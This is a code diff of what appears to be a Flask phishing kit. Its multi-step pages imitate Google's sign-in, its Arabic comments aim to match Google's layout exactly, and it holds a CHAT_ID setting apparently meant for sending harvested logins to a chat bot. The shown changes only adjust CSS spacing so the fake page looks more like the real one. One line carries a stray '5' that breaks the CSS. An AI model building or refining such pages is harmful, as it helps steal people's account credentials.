@@ -12,7 +12,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: تعديل التوزيع لتكون كلمة "إنشاء حساب" في مكانها الطبيعي تماماً مثل جوجل
+# الصفحة الأولى: تعديل التنسيق لضمان ظهور المسافة المطلوبة بدقة
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
@@ -64,7 +64,6 @@ def step1():
             flex-direction: column;
             align-items: center;
             text-align: center;
-            flex: 1;
         }
 
         .google-g {
@@ -112,15 +111,11 @@ def step1():
         .input-wrapper {
             width: 100%;
             text-align: right;
-            display: flex;
-            flex-direction: column;
-            /* ضبط المسافة المتبقية لتوزيع الروابط بشكل مثالي ومتطابق مع التصميم الأصلي */
-            justify-content: flex-start;
         }
 
         .input-group { 
             width: 100%; 
-            margin-bottom: 12px;
+            margin-bottom: 14px;
         }
         
         .input-group input {
@@ -139,8 +134,8 @@ def step1():
             font-size: 14px;
             text-decoration: none;
             font-weight: 500;
-            display: inline-block;
-            margin-bottom: 28px; /* مسافة مدروسة بين هل نسيت بريدك وإنشاء حساب */
+            display: block;
+            margin-bottom: 35px; /* زيادة المسافة بوضوح لتنزيل "إنشاء حساب" للمكان المطلوب تماماً */
         }
         .forgot-link:hover { text-decoration: underline; }
 
@@ -345,7 +340,7 @@ def step2():
             margin-bottom: 8px; 
         }
         
-        .input-group input {
+5        .input-group input {
             width: 100%;
             padding: 12px 14px;
             font-size: 15px;
